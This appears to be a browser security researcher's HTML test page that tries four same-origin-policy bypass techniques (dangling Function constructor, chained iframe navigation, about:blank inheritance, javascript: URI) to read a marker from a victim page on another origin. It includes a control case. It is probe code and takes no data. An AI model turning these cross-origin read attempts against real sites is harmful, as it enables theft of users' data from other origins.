<!doctype html><meta charset=utf-8><title>UXSS sweep</title>
<body style="font:15px system-ui;padding:1rem;max-width:820px;margin:auto">
<h1>UXSS sweep — 2 real origins</h1>
<p>this origin: <code id=me></code></p>
<p>victim: <input id=v size=62 value="https://raw.githack.com/xnxrx/xnurx/main/uxss-v.html"></p>
<p><button data-a=c>CONTROL (must be BLOCKED)</button>
<button data-a=1>ARM-1 dangling</button>
<button data-a=2>ARM-2 chained-nav</button>
<button data-a=3>ARM-3 about:blank inherit</button>
<button data-a=4>ARM-4 javascript: URI</button></p>
<div id=r style="font:13px monospace;white-space:pre-wrap"></div>
<script>
var F=location.origin,out={};
document.getElementById('me').textContent=F;
function say(k,s,d){out[k]=s+' | '+d;document.getElementById('r').textContent=
 Object.keys(out).map(function(x){return x+': '+out[x]}).join('\n');}
function vu(){return document.getElementById('v').value.trim()}
function fr(){var f=document.createElement('iframe');
 f.style.cssText='position:absolute;left:-9999px;width:1px;height:1px';return f}
function rd(w){var d=w.document,e=d.getElementById('m');return (e?e.textContent:d.title)||'(empty)'}
function tryRead(k,w,lbl){try{var m=rd(w);
 if(String(m).indexOf('VICTIM-MARKER')===0)say(k,'CROSSED',lbl+' -> '+m+' [code from '+F+']');
 else say(k,'INCONCLUSIVE',lbl+' -> reachable, no marker: '+String(m).slice(0,40));}
 catch(e){say(k,'BLOCKED',lbl+' -> '+e.name)}}
var A={
c:function(){var f=fr();f.onload=function(){tryRead('CONTROL',f.contentWindow,'plain iframe')};
 f.src=vu();document.body.appendChild(f)},
1:function(){var f=fr();f.src='about:blank';document.body.appendChild(f);
 setTimeout(function(){var o=null;try{o=f.contentWindow}catch(e){}
  if(!o)return say('ARM1','INCONCLUSIVE','no handle');
  f.onload=function(){try{var C=o.Function;if(!C)return say('ARM1','INCONCLUSIVE','no Function ctor');
   var g=C('try{var e=document.getElementById("m");return e?e.textContent:document.title}catch(x){return "ERR:"+x.name}')();
   if(String(g).indexOf('VICTIM-MARKER')===0)say('ARM1','CROSSED','dangling Function() -> '+g);
   else say('ARM1','BLOCKED','confined: '+g)}catch(e){say('ARM1','BLOCKED',e.name)}};
  f.src=vu()},80)},
2:function(){var s=['about:blank',vu(),'about:blank',vu()],i=0,h=null,f=fr();
 f.onload=function(){if(!h){try{h=f.contentWindow}catch(e){}}i++;
  if(i<s.length){setTimeout(function(){f.src=s[i]},120);return}
  setTimeout(function(){tryRead('ARM2',h,'handle across 4 navs')},200)};
 f.src=s[0];document.body.appendChild(f)},
3:function(){var f=fr();document.body.appendChild(f);
 setTimeout(function(){var inh=null;try{inh=f.contentWindow;inh.document.open();
  inh.document.write('<p>inherited</p>');inh.document.close()}catch(e){
  return say('ARM3','INCONCLUSIVE','cannot write: '+e.name)}
  f.onload=function(){tryRead('ARM3',inh,'inherited about:blank handle')};f.src=vu()},60)},
4:function(){var f=fr();f.onload=function(){try{f.src='javascript:void(0)';
  setTimeout(function(){tryRead('ARM4',f.contentWindow,'javascript: URI nav')},250)}
  catch(e){say('ARM4','BLOCKED',e.name)}};f.src=vu();document.body.appendChild(f)}};
document.addEventListener('click',function(e){var a=e.target.getAttribute&&e.target.getAttribute('data-a');
 if(a&&A[a])A[a]()});
</script>
